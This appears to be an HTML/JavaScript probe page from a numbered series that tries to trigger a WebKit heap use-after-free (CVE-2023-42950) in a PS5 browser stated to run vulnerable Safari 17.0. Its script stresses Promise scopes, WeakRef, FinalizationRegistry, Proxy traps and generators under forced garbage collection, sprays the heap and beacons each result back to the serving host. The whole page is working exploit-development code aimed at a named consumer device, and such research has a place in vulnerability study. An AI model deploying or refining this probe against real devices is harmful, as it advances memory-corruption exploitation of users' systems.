<!--
  p694: CVE-2023-42950 -- WebKit heap UAF (Nan Wang / 360 VRI)

  CVE-2023-42950: Heap use-after-free in WebKit, fixed Safari 17.2.
  Found by Nan Wang of 360 Vulnerability Research Institute and
  Rushikesh Nandedkar. CWE-416. WebKit Bug 263682. CVSS 8.8.

  PS5 has Safari 17.0 (605.1.15) -- VULNERABLE.

  A heap UAF typically involves:
  1. Object A allocated on heap
  2. Object A freed (ref count drops to 0, or explicit delete)
  3. Object B allocated in same heap slot (type confusion)
  4. Code still holding pointer to A accesses it, reading B's data

  Since this is from 360 VRI (a major Chinese security research lab),
  the bug is likely in a complex WebKit subsystem. We test heap-intensive
  paths that manage object lifecycles:

  Patterns tested:
  A) Promise reaction job with captured scope freed by GC
  B) WeakRef deref() after target collected but ref still live
  C) FinalizationRegistry callback accessing cleaned-up value
  D) Proxy handler object freed during trap execution
  E) Generator/async function resumption after scope objects freed

  CRASH_CLASS: MODERATE (heap UAF through stale JS/C++ object)
  prior art: p553 (Canvas2D UAF), p599 (FontFace destructor path)
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p694</title>
<script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}

function main(){
  b('P694-START:CVE-2023-42950-HEAP-UAF');
  var results = [];

  // === SECTION A: Promise reaction with freed scope ===
  b('A:PROMISE-SCOPE');
  try {
    var leaked = [];

    function createLeakyPromise() {
      var bigData = new ArrayBuffer(16384);
      var view = new Uint8Array(bigData);
      for (var i = 0; i < view.length; i++) view[i] = 0xBB;

      return new Promise(function(resolve) {
        // Capture bigData in closure
        setTimeout(function() {
          resolve(bigData);
        }, 10);
      }).then(function(data) {
        // This callback captures 'data' (the ArrayBuffer)
        // If the promise machinery frees the reaction job
        // before the callback runs...
        leaked.push(data.byteLength);
        return data;
      });
    }

    // Create many promises, let some resolve, GC mid-chain
    var promises = [];
    for (var i = 0; i < 100; i++) {
      promises.push(createLeakyPromise());
    }

    // Force GC while promises are pending
    for (var i = 0; i < 5000; i++) new ArrayBuffer(4096);

    Promise.all(promises).then(function(results_arr) {
      b('A:ALL-RESOLVED:count=' + results_arr.length);
      var valid = 0;
      for (var i = 0; i < results_arr.length; i++) {
        if (results_arr[i] && results_arr[i].byteLength === 16384) valid++;
      }
      b('A:VALID-BUFFERS:' + valid + '/100');
      if (valid < 100) {
        b('A:MISSING-BUFFERS');
        results.push('A:missing');
      }
      runSectionB();
    }).catch(function(e) {
      b('A:PROMISE-ERR:' + e.message);
      runSectionB();
    });
  } catch(e) {
    b('A:ERR:' + e.message);
    runSectionB();
  }

  function runSectionB() {
    // === SECTION B: WeakRef deref after collection ===
    b('B:WEAKREF');
    try {
      if (typeof WeakRef !== 'undefined') {
        var refs = [];

        // Create objects and weak references to them
        for (var i = 0; i < 100; i++) {
          var obj = { id: i, data: new ArrayBuffer(1024) };
          refs.push(new WeakRef(obj));
        }

        // Drop strong references
        // (can't explicitly null the loop variable, but scope ends)

        // Heavy GC pressure
        for (var g = 0; g < 10; g++) {
          for (var i = 0; i < 5000; i++) new ArrayBuffer(2048);
        }

        // Spray with different objects
        var spray = [];
        for (var i = 0; i < 4096; i++) {
          spray.push({ id: 'spray-' + i, fake: new ArrayBuffer(1024) });
        }

        // Deref all weak refs
        var alive = 0;
        var dead = 0;
        var weird = 0;
        for (var i = 0; i < refs.length; i++) {
          var val = refs[i].deref();
          if (val === undefined) {
            dead++;
          } else if (val.id === i) {
            alive++;
          } else {
            weird++;
            b('B:WEIRD-DEREF:expected=' + i + ',got=' + JSON.stringify(val).substring(0, 50));
            results.push('B:type-confusion');
          }
        }
        b('B:ALIVE=' + alive + ',DEAD=' + dead + ',WEIRD=' + weird);
      } else {
        b('B:NO-WEAKREF');
      }
      runSectionC();
    } catch(e) {
      b('B:ERR:' + e.message);
      runSectionC();
    }
  }

  function runSectionC() {
    // === SECTION C: FinalizationRegistry callback ===
    b('C:FINALIZATION');
    try {
      if (typeof FinalizationRegistry !== 'undefined') {
        var callbacks = [];
        var fr = new FinalizationRegistry(function(heldValue) {
          callbacks.push(heldValue);
          b('C:FINALIZED:' + heldValue);

          // Access held value aggressively
          if (typeof heldValue === 'object' && heldValue !== null) {
            try {
              b('C:HELD-KEYS:' + Object.keys(heldValue).join(','));
            } catch(e2) {
              b('C:HELD-ERR:' + e2.message);
              results.push('C:stale-held');
            }
          }
        });

        // Register objects with held values that reference each other
        for (var i = 0; i < 50; i++) {
          var obj = { idx: i };
          var held = { ref: i, data: new Array(100).fill(i) };
          fr.register(obj, held);
        }

        // Drop all references, force GC
        for (var g = 0; g < 20; g++) {
          for (var i = 0; i < 3000; i++) new ArrayBuffer(2048);
        }

        // Give finalizers time to run
        setTimeout(function() {
          b('C:CALLBACKS-RECEIVED:' + callbacks.length);
          runSectionD();
        }, 500);
      } else {
        b('C:NO-FINALIZATIONREGISTRY');
        runSectionD();
      }
    } catch(e) {
      b('C:ERR:' + e.message);
      runSectionD();
    }
  }

  function runSectionD() {
    // === SECTION D: Proxy handler freed during trap ===
    b('D:PROXY-HANDLER-FREE');
    try {
      var handlerCallCount = 0;

      var handler = {
        get: function(target, prop) {
          handlerCallCount++;
          // During this trap, null out our own handler reference
          if (handlerCallCount === 50) {
            handler = null;
            // Force GC during trap execution
            for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
          }
          return target[prop];
        },
        set: function(target, prop, value) {
          handlerCallCount++;
          if (handlerCallCount >= 100) {
            // Force GC
            for (var i = 0; i < 2000; i++) new ArrayBuffer(1024);
          }
          target[prop] = value;
          return true;
        }
      };

      var proxy = new Proxy({}, handler);

      // Hammer the proxy
      try {
        for (var i = 0; i < 200; i++) {
          proxy['key' + i] = i;
          var v = proxy['key' + i];
          if (v !== i) {
            b('D:WRONG-VALUE:key=' + i + ',got=' + v);
            results.push('D:wrong-value');
            break;
          }
        }
        b('D:PROXY-CALLS:' + handlerCallCount);
      } catch(e2) {
        b('D:PROXY-ERR:' + e2.message);
      }
      runSectionE();
    } catch(e) {
      b('D:ERR:' + e.message);
      runSectionE();
    }
  }

  function runSectionE() {
    // === SECTION E: Generator resumption after scope freed ===
    b('E:GENERATOR-SCOPE');
    try {
      function* leakyGenerator() {
        var bigArr = new Array(10000).fill(42);
        yield bigArr.length;

        // After yield, scope may have been collected if generator
        // was considered dead
        for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);

        yield bigArr[0]; // access scope variable after GC

        // Modify and yield again
        bigArr[5000] = 99;
        yield bigArr[5000];
      }

      var gen = leakyGenerator();

      // First yield
      var v1 = gen.next();
      b('E:YIELD-1:' + v1.value);

      // Force GC between yields
      for (var i = 0; i < 10000; i++) new ArrayBuffer(2048);
      var spray5 = [];
      for (var i = 0; i < 4096; i++) spray5.push(new ArrayBuffer(80));

      // Second yield -- generator scope should still be alive
      var v2 = gen.next();
      b('E:YIELD-2:' + v2.value);
      if (v2.value !== 42) {
        b('E:SCOPE-CORRUPTED:expected=42,got=' + v2.value);
        results.push('E:scope-corruption');
      }

      // More GC
      spray5 = null;
      for (var i = 0; i < 10000; i++) new ArrayBuffer(2048);

      // Third yield
      var v3 = gen.next();
      b('E:YIELD-3:' + v3.value);
      if (v3.value !== 99) {
        b('E:SCOPE-CORRUPTED-2:expected=99,got=' + v3.value);
        results.push('E:scope-corruption-2');
      }

      gen.return(); // cleanup

      // Test async generator too
      async function* asyncGen() {
        var data = new ArrayBuffer(8192);
        var view = new Uint8Array(data);
        view[0] = 0xAA;
        yield view[0];
        await new Promise(function(r) { setTimeout(r, 50); });
        yield view[0]; // after await + potential GC
      }

      var ag = asyncGen();
      ag.next().then(function(r1) {
        b('E:ASYNC-1:' + r1.value);
        // GC during await
        for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
        return ag.next();
      }).then(function(r2) {
        b('E:ASYNC-2:' + r2.value);
        if (r2.value !== 0xAA) {
          b('E:ASYNC-CORRUPTED');
          results.push('E:async-corruption');
        }
        finish();
      }).catch(function(e) {
        b('E:ASYNC-ERR:' + e.message);
        finish();
      });
    } catch(e) {
      b('E:ERR:' + e.message);
      finish();
    }
  }

  function finish() {
    if (results.length > 0) {
      b('P694-RESULT:HITS=' + results.join(';'));
    } else {
      b('P694-RESULT:NO-UAF-DETECTED');
    }
    b('P694-DONE');
  }
}

setTimeout(main, 200);
</script>
